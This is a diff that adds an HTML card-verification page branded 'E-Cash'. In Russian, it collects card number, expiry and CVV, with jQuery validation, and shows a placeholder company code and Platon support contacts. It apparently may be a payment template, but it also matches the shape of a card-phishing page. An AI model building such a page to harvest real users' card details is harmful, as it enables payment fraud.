@@ -1,0 +1,148 @@
+<!DOCTYPE HTML>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Верификация карты | E-Cash</title>
+    <link href="css/styles.css" rel="stylesheet" type="text/css">
+    <!-- mobile -->
+    <link href="css/mobile.css" rel="stylesheet" type="text/css" media="only screen and (max-device-width:610px)">
+     <!-- tablet -->
+    <link href="css/tablet.css" rel="stylesheet" type="text/css" media="only screen and (min-device-width:611px) and (max-device-width:894px)">
+    
+  </head>
+  <body>
+    <div class="wrapper">
+      <div class="header">
+        <a href="https://www.e-cash.com.ua/" target="_blank"><img src="images/e-cash_logo.png" alt="Логотип" class="logo"></a>
+      </div>
+      <div class="content">
+        <div class="p_page">
+          <h1>Форма верификации кредитной карты</h1>
+          <p class="notice">Введите данные кредитной карты. На ней будет заблокированна случайная сумма до 1 грн. Сумма разблокируется через несколько минут.</p>
+          <div class="info">
+            <p class="company">Компания&nbsp;&nbsp;-&nbsp;</p>
+            <p class="company_name">E-Cash</p>
+            <p style="display:inline-block;width:20px;">&nbsp;/&nbsp;</p>
+            <p class="discription">РНКПП&nbsp;&nbsp;&nbsp;-</p>
+            <p class="value">12345678</p>
+          </div>
+          <div class="information">
+            <img src="images/info.svg" alt="">
+            <p class="label">Введите данные кредитной карты</p>
+          </div>
+          <div class="spin"></div>
+          <div class="card">
+            <!-- card -->
+            <form action="#" method="post" class="cardpay" id="process" novalidate="novalidate">
+              <div class="card_top">
+                <div class="numbercard" id="numbercard">
+                  <input type="tel" id="card_num" name="card_num" class="payment__input" pattern="[0-9]*" maxlength="19" >
+                  <div class="mps cards"><img src="images/card.png"></div>
+                  <div class="mps visa"><img src="images/m_visa.svg" alt=""></div>
+                  <div class="mps mastercard"><img src="images/m_mastercard.svg"></div>
+                  <div class="mps maestro"><img src="images/m_maestro.svg"></div>
+                </div>
+                <div class="datecard" id="exp_date_card" name="exp_date_card">
+                  <input type="tel" id="card_exp_month" name="card_exp_month" placeholder="Месяц" autocomplete="off" minlength="2" maxlength="2" pattern="[0-9]*" onkeyup="if(this.value.length >= 2){document.getElementById('card_exp_year').focus();}"/>
+                  <p id="datecard">/</p>
+                  <input type="tel" id="card_exp_year" name="card_exp_year" placeholder="Год" autocomplete="off" minlength="4" maxlength="4" pattern="[0-9]*" onkeyup="return controlyear(this)"/>
+                </div>
+              </div>
+              <div class="card_bg">
+                <div class="line_bg"></div>
+                <div class="cod">
+                  <input type="tel" placeholder="XXX" maxlength="3" id="cvv" name="cvv" pattern="[0-9]*" />
+                  <span> CVC2/CVV2:</span>
+                </div>
+              </div> 
+              <input id="button" type="submit" value="Подтвердить">
+            </form>
+          </div>
+          <!-- /card -->
+          <div class="support">В случае неуспешного платежа обратитесь в Службу поддержки Platon.<br>
+            0 (800) 750-504 - бесплатно со стационарных и мобильных телефонов всех операторов Украины;<br>
+            +38 (044) 339-99-04 - для международных звонков;<br>
+            или напишите нам <a href="mailto:support@platonline.com">support@platonline.com</a>
+            <br>
+            <br>
+            <p>*Ваш IP-адрес мониторится для предотвращения мошенничества.<br>
+            *Мошенничество преследуется по закону.</p> 
+          </div>
+          <div class="logo_mps">
+            <img id="mc" src="images/mastercard.svg">
+            <img id="visa" src="images/visa.svg">
+            <img id="v_sc" src="images/v-visa.png">
+            <img id="mc_sc" src="images/MasterCard_SecureCode.svg">
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+  <script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="js/jquery.creditCardValidator.js"></script>
+  <script type="text/javascript" src="js/jquery.mask.min.js"></script>
+  <script type="text/javascript" src="js/validator-1.17.0.min.js"></script>
+  <script type="text/javascript" src="js/lib.js"></script>
+  <script>
+
+$('#process').validate({
+    submitHandler: function(form) {
+        $('#button').attr('disabled', 'disabled');
+        $(".card").fadeTo("fast",0.2);
+        form.submit();
+    },
+    groups: {
+        card_num: 'card_num',
+        cardexp: 'card_exp_month card_exp_year',
+    },
+    errorPlacement: function(error, element) {
+        if (element.attr('name') == 'card_exp_month' || element.attr('name') == 'card_exp_year') {
+            error.insertAfter('#exp_date_card');
+        } else if (element.attr('name') == 'card_num') {
+            error.insertAfter('#card_num');
+        } else {
+            error.insertAfter(element);
+        }
+    },
+    rules: {
+        card_num: {
+            required: true,
+            minlength: 19,
+        },
+        card_exp_month: {
+            required: true,
+        },
+        card_exp_year: {
+            required: true,
+        },
+        cvv: {
+            required: true,
+            minlength: 3,
+            maxlength: 3,
+            digits: true
+        },
+    },
+    messages: {
+        card_num: {
+            required: "Пожалуйста, введите номер карты",
+            minlength: "Пожалуйста, введите 16 символов карты",
+        },
+        card_exp_month: {
+            minlength: "Пожалуйста, введите 2 цифры",
+            required: "Пожалуйста, введите срок действия",
+        },
+        card_exp_year: {
+            minlength: "Пожалуйста, введите 4 цифры",
+            required: "Пожалуйста, введите срок действия",
+        },
+        cvv: {
+            required: "Пожалуйста, введите СCV код",
+            minlength: "Пожалуйста, введите 3 цифры CVV-кода",
+            maxlength: "CVV код должен состоять не более чем из 3 цифр",
+            digits: "Пожалуйста, введите цифры",
+        },
+    }
+});
+  </script>
+</html>
